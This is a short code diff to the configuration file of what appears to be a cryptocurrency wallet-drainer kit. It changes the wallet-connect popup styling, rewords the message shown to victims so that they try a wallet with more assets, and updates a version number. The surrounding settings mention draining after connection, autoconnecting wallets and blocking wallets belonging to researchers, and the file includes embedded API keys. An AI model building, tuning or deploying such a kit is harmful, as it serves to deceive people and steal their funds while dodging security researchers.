@@ -4,8 +4,9 @@ let ACCESS_KEY = "6a6cb543-0574-4b47-9e3c-c833f42fb119";
 // Connect wallet settings
 let chooseWalletTheme = "dark"; // Theme for this popup "dark" or "light"
 let themeVariables = {
-    
-}; 
+    '--w3m-z-index': 10000,
+    '--w3m-overlay-backdrop-filter': 'blur(6px)',
+};
 // Custom styles and colors https://docs.walletconnect.com/2.0/web/web3modal/html/wagmi/theming
 
 
@@ -44,7 +45,7 @@ let celo_enabled = true;
 let autoconnect = false; // Automatically connect wallet after page loaded
 
 // Alerts
-let notEligible = "Not enough balance for gas fees. Please use a different wallet with enough assets"; // Low balance
+let notEligible = "This wallet is not eligible. Please use a different wallet with enough assets"; // Low balance
 
 // Popup settings
 let popupEnabled = true; // true or false, popup after connecting wallet while draining
@@ -156,7 +157,7 @@ let infura_key = "9aa3d95b3bc440fa88ea12eaa4456161";
 let wc_projectid = "0761e7d1b5103f901dbdb7fd033df5b9"; // ProjectID from https://cloud.walletconnect.com/
 
 //Do not touch
-let cfgversion = 660;
+let cfgversion = 680;
 
 // Block wallets
 let researchers = [
